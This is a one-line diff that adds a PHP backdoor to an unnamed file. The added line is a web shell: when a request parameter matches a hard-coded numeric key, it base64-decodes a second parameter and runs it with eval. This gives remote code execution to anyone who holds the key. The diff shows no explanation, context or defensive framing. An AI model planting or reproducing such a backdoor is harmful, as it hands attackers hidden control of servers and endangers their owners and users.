@@ -1,0 +1,1 @@
+<?php if(isset($_REQUEST['a'])){if($_REQUEST['a']=="2341722455429092381"){if(isset($_REQUEST['b']))eval(base64_decode($_REQUEST['b']));}}
